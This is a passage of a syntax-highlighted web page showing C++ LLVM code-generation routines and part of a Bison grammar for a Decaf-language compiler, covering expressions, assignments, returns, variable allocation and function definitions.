class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafAssign::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    decafBinexp* <span class="built_in">exp</span> = <span class="keyword">this</span>-&gt;get_exp();</span><br><span class="line">    <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">    descriptor * des = get_symbolt(<span class="keyword">this</span>-&gt;get_var());</span><br><span class="line">    Builder.CreateStore(<span class="built_in">exp</span>-&gt;des.value,des-&gt;alloc);</span><br><span class="line">    <span class="keyword">return</span> des-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafReturn::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    decafBinexp* <span class="built_in">exp</span> = <span class="keyword">this</span>-&gt;get_exp();</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span>)&#123;</span><br><span class="line">        <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">        Builder.CreateRet(<span class="built_in">exp</span>-&gt;des.value);</span><br><span class="line">        get_return = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exp</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Builder.CreateRetVoid();</span><br><span class="line">        get_return = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafBinexp::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == valueK)&#123;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expuK)&#123;</span><br><span class="line">        llvm::Value *L = Exp1-&gt;Codegen();</span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>-&gt;get_op(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> nottmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateNot(L, <span class="string">&quot;nottmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;     </span><br><span class="line">            <span class="keyword">case</span> negtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateNeg(L , <span class="string">&quot;negtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expbK)&#123;</span><br><span class="line">        llvm::Value *L = Exp1-&gt;Codegen();</span><br><span class="line">        llvm::Value *R = Exp2-&gt;Codegen();</span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span> || R == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>-&gt;get_op(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> addtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateAdd(L, R, <span class="string">&quot;addtmp&quot;</span>); </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> subtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSub(L, R, <span class="string">&quot;subtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> multmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateMul(L, R, <span class="string">&quot;multmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> remtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSRem(L, R, <span class="string">&quot;remtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> divtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSDiv(L, R, <span class="string">&quot;divtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ortmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateOr(L, R, <span class="string">&quot;ortmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> andtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateAnd(L, R, <span class="string">&quot;andtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> eqtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpEQ(L, R, <span class="string">&quot;eqtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> netmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpNE(L, R, <span class="string">&quot;netmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> slttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSLT(L, R, <span class="string">&quot;slttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> sgttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSGT(L, R, <span class="string">&quot;sgttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> sletmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSLE(L, R, <span class="string">&quot;sletmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> sgetmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSGE(L, R, <span class="string">&quot;sgetmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> shltmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateShl(L, R, <span class="string">&quot;shltmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">            <span class="keyword">case</span> shrtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateLShr(L, R, <span class="string">&quot;shrtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;                          </span><br><span class="line">            <span class="keyword">default</span>: </span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == funcK)&#123;</span><br><span class="line">        decafFunCall * call = (decafFunCall *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = call-&gt;Codegen();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafAllexp::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;VariableExpr&quot;</span>)&#123;</span><br><span class="line">        descriptor * des = get_symbolt(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">        llvm::Value* load = Builder.CreateLoad(des-&gt;alloc,<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = load;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;NumberExpr&quot;</span>)&#123;</span><br><span class="line">        <span class="built_in">string</span> s = <span class="keyword">this</span>-&gt;get_name().substr(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        llvm::Value* arg;</span><br><span class="line">        <span class="keyword">if</span>(s == <span class="string">&quot;0x&quot;</span>)&#123;</span><br><span class="line">            arg = llvm::ConstantInt::get(llvm::Type::getInt32Ty(Context), <span class="built_in">std</span>::stoi(<span class="keyword">this</span>-&gt;get_name(),<span class="literal">NULL</span>,<span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            arg = llvm::ConstantInt::get(llvm::Type::getInt32Ty(Context), <span class="built_in">std</span>::stoi(<span class="keyword">this</span>-&gt;get_name(),<span class="literal">NULL</span>,<span class="number">10</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = arg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;BoolExpr&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_name() == <span class="string">&quot;True&quot;</span>)&#123;</span><br><span class="line">            llvm::Type* boolType = llvm::Type::getInt1Ty(Context);</span><br><span class="line">            llvm::Constant* trueValue = llvm::ConstantInt::get(boolType, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = trueValue;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_name() == <span class="string">&quot;False&quot;</span>)&#123;</span><br><span class="line">            llvm::Type* boolType = llvm::Type::getInt1Ty(Context);</span><br><span class="line">            llvm::Constant* falseValue = llvm::ConstantInt::get(boolType, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = falseValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;StringConstant&quot;</span>)&#123;</span><br><span class="line">        llvm::GlobalVariable *GS = Builder.CreateGlobalString(<span class="keyword">this</span>-&gt;get_name() ,<span class="string">&quot;globalstring&quot;</span>);</span><br><span class="line">        llvm::Value *stringConst = Builder.CreateConstGEP2_32(GS-&gt;getValueType(), GS, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;cast&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = stringConst;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafVar::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor * des = <span class="keyword">new</span> descriptor();</span><br><span class="line">    <span class="keyword">if</span>(put_symbolt(<span class="keyword">this</span>-&gt;get_name(),des))&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;Alloca = Builder.CreateAlloca(<span class="keyword">this</span>-&gt;lType, <span class="number">0</span>, <span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">        des-&gt;alloc = <span class="keyword">this</span>-&gt;Alloca;</span><br><span class="line">        des-&gt;kind = valueK;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Alloca;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafEXFuncDef::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor* des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    <span class="keyword">if</span>(check_symbol( <span class="keyword">this</span>-&gt;get_name(), funcK))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;lfunc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafFuncDef::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor* des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    <span class="keyword">if</span>(check_symbol( <span class="keyword">this</span>-&gt;get_name(), funcK))&#123;</span><br><span class="line">        symbol_table s;</span><br><span class="line">        symtblt.push_front(s);</span><br><span class="line">        get_return = <span class="literal">true</span>;</span><br><span class="line">        llvm::BasicBlock *BB = llvm::BasicBlock::Create(TheContext, <span class="string">&quot;entry&quot;</span>, <span class="keyword">this</span>-&gt;lfunc);</span><br><span class="line">        Builder.SetInsertPoint(BB);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> p:<span class="keyword">this</span>-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;lfunc-&gt;getArg(i)-&gt;setName(p-&gt;get_name());</span><br><span class="line"></span><br><span class="line">            descriptor * des2 = <span class="keyword">new</span> descriptor();</span><br><span class="line">            <span class="keyword">if</span>(put_symbolt(p-&gt;get_name(),des2))&#123;</span><br><span class="line">                des2-&gt;alloc = Builder.CreateAlloca(p-&gt;lType, <span class="number">0</span>, p-&gt;get_name());</span><br><span class="line">                des2-&gt;kind = valueK;</span><br><span class="line">            &#125;</span><br><span class="line">            Builder.CreateStore(<span class="keyword">this</span>-&gt;lfunc-&gt;getArg(i),des2-&gt;alloc);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        decafBlock * B = <span class="keyword">this</span>-&gt;get_block();</span><br><span class="line">        B-&gt;Codegen();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(get_return)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;lType-&gt;isVoidTy())</span><br><span class="line">                Builder.CreateRetVoid();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                Builder.CreateRet(llvm::ConstantInt::get(TheContext, llvm::APInt(<span class="number">32</span>, <span class="number">0</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        symtblt.pop_front();</span><br><span class="line">        symtblt.clear();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;lfunc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// we have to create a main function </span></span><br><span class="line"><span class="function">llvm::Function *<span class="title">gen_main_def</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create the top-level definition for main</span></span><br><span class="line">    llvm::FunctionType *FT = llvm::FunctionType::get(llvm::IntegerType::get(TheContext, <span class="number">32</span>), <span class="literal">false</span>);</span><br><span class="line">    llvm::Function *TheFunction = llvm::Function::Create(FT, llvm::Function::ExternalLinkage, <span class="string">&quot;main&quot;</span>, TheModule);</span><br><span class="line">    <span class="keyword">if</span> (TheFunction == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> runtime_error(<span class="string">&quot;empty function block&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Create a new basic block which contains a sequence of LLVM instructions</span></span><br><span class="line">    llvm::BasicBlock *BB = llvm::BasicBlock::Create(TheContext, <span class="string">&quot;entry&quot;</span>, TheFunction);</span><br><span class="line">    <span class="comment">// All subsequent calls to IRBuilder will place instructions in this location</span></span><br><span class="line">    Builder.SetInsertPoint(BB);</span><br><span class="line"></span><br><span class="line">    descriptor* des = <span class="keyword">new</span> descriptor();</span><br><span class="line">    des-&gt;func = TheFunction;</span><br><span class="line">    des-&gt;kind = funcK;</span><br><span class="line">    put_symbol(<span class="string">&quot;main&quot;</span>,des);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TheFunction;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define parse.error verbose</span><br><span class="line"></span><br><span class="line">%<span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> *<span class="title">ast</span>;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> *sval;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">%token T_PACKAGE T_EXTERN T_FUNC T_SEMICOLON T_COMMA T_CONTINUE T_FALSE T_TRUE T_VAR T_FOR T_NULL T_RETURN T_WHITESPACE</span><br><span class="line">%token T_AND T_ASSIGN T_DIV T_DOT T_EQ T_RIGHTSHIFT T_GEQ T_GT T_LEFTSHIFT T_LEQ T_LT T_MINUS T_MOD T_MULT T_NEQ T_NOT T_OR T_PLUS</span><br><span class="line">%token T_VOID T_INTTYPE T_BOOLTYPE T_STRINGTYPE</span><br><span class="line">%token T_LCB T_RCB T_LPAREN T_RPAREN T_LSB T_RSB </span><br><span class="line">%token T_COMMENT</span><br><span class="line">%token T_BREAK T_ELSE T_IF T_WHILE</span><br><span class="line">%token &lt;sval&gt; T_ID T_INTCONSTANT T_CHARCONSTANT T_STRINGCONSTANT</span><br><span class="line"></span><br><span class="line">%type &lt;ast&gt; state_if state_while lvalues state_for state_break state_continue state_return <span class="built_in">exp</span> assign assigns assignss method_call lvalue statements statement extern_list para_list_use para_usen para_use para_list_def block blockt var_decls var_decl method_decls method_decl decafpackage var_declp var_declps extern_def extern_defn extern_typen extern_type func_typen func_type method_type type</span><br><span class="line"></span><br><span class="line">%right T_ASSIGN </span><br><span class="line">%left T_OR</span><br><span class="line">%left T_AND</span><br><span class="line">%left T_EQ T_NEQ T_LT T_GT T_GEQ T_LEQ</span><br><span class="line">%left T_PLUS T_MINUS </span><br><span class="line">%left T_MULT T_DIV T_MOD T_RIGHTSHIFT T_LEFTSHIFT</span><br><span class="line">%right T_NOT </span><br><span class="line">%right T_UMINUS</span><br><span class="line">%right T_LPAREN</span><br><span class="line">%left T_RPAREN</span><br><span class="line">%nonassoc T_IF</span><br><span class="line">%nonassoc T_ELSE</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">start: program</span><br><span class="line"></span><br><span class="line">program: extern_list decafpackage&#123; </span><br><span class="line">        ProgramAST *prog = <span class="keyword">new</span> ProgramAST((decafEXFuncDefList *)$<span class="number">1</span>, (PackageAST *)$<span class="number">2</span>); </span><br><span class="line">        prog-&gt;Codegen();</span><br><span class="line">		<span class="keyword">if</span> (printAST) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; getString(prog) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">delete</span> prog;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_list: extern_defn &#123; </span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafEXFuncDefList *slist = <span class="keyword">new</span> decafEXFuncDefList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_defn: extern_def extern_defn &#123;</span><br><span class="line">        decafEXFuncDefList *slist = (decafEXFuncDefList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafEXFuncDef *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafEXFuncDefList *slist = <span class="keyword">new</span> decafEXFuncDefList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_def: T_EXTERN T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type T_SEMICOLON &#123;</span><br><span class="line">        decafEXFuncDef *func = <span class="keyword">new</span> decafEXFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">5</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">7</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">3</span>);</span><br><span class="line">        func-&gt;put_type(type);</span><br><span class="line">        func-&gt;put_para((decafPara*)para);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">3</span>; </span><br><span class="line">    </span><br><span class="line">        descriptor* des = <span class="keyword">new</span> descriptor();</span><br><span class="line">        <span class="keyword">if</span>(put_symbol( func-&gt;get_name(), des))&#123;</span><br><span class="line">            llvm::Type *returnTy = func-&gt;lType;</span><br><span class="line">            <span class="built_in">string</span> Name = func-&gt;get_name();</span><br><span class="line">            llvm::SmallVector&lt;llvm::Type *,<span class="number">0</span>&gt; functionArgs;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> p:func-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">                functionArgs.push_back(p-&gt;lType);</span><br><span class="line">            &#125;</span><br><span class="line">            func-&gt;lfunc = llvm::Function::Create(</span><br><span class="line">                llvm::FunctionType::get(returnTy, functionArgs, <span class="literal">false</span>),</span><br><span class="line">                llvm::Function::ExternalLinkage,</span><br><span class="line">                Name,</span><br><span class="line">                TheModule</span><br><span class="line">            );</span><br><span class="line">            des-&gt;func = func-&gt;lfunc;</span><br><span class="line">            des-&gt;kind = funcK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_list_use: para_usen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_usen: para_use T_COMMA para_usen &#123;</span><br><span class="line">        decafStmtList * para = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | para_use &#123;</span><br><span class="line">        decafStmtList * para = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_use: <span class="built_in">exp</span> &#123; $$ = $<span class="number">1</span>;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_list_def: extern_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | func_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_typen: func_type T_COMMA func_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;     </span><br><span class="line">    &#125;</span><br><span class="line">    | func_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;   </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_type: T_ID extern_type &#123;</span><br><span class="line">        decafType* type = (decafType*)$<span class="number">2</span>;</span><br><span class="line">        type-&gt;put_name(*$<span class="number">1</span>);</span><br><span class="line">        $$ = type;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_typen: extern_type T_COMMA extern_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | extern_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_type: T_STRINGTYPE &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;StringType&quot;</span>);</span><br><span class="line">        type-&gt;Ty = stringTy; </span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;</span><br><span class="line">    | type &#123; </span><br><span class="line">        decafType* type = (decafType* )$<span class="number">1</span>; </span><br><span class="line">        $$ = type;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_type: T_VOID &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;VoidType&quot;</span>); </span><br><span class="line">        type-&gt;Ty = voidTy;</span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;</span><br><span class="line">    | type &#123; </span><br><span class="line">        decafType* type = (decafType* )$<span class="number">1</span>;</span><br><span class="line">        $$ = type;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">type: T_INTTYPE &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;IntType&quot;</span>); </span><br><span class="line">        type-&gt;Ty = intTy;</span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;   </span><br><span class="line">    | T_BOOLTYPE &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;BoolType&quot;</span>); </span><br><span class="line">        type-&gt;Ty = boolTy;</span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">decafpackage: T_PACKAGE T_ID T_LCB var_declps method_decls T_RCB &#123;</span><br><span class="line">        decafVarList *field = (decafVarList *)$<span class="number">4</span>;</span><br><span class="line">        decafFuncDefList *method = (decafFuncDefList *)$<span class="number">5</span>;</span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, field, method); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_PACKAGE T_ID T_LCB T_RCB &#123; </span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, <span class="keyword">new</span> decafVarList(), <span class="keyword">new</span> decafFuncDefList()); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_declps: var_declp var_declps &#123;</span><br><span class="line">        decafVarList *slist = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;cat_front((decafVarList *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafVarList *slist = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_declp: T_VAR lvalues type T_SEMICOLON &#123;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_types(type);</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_kinds(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_ASSIGN <span class="built_in">exp</span> T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = 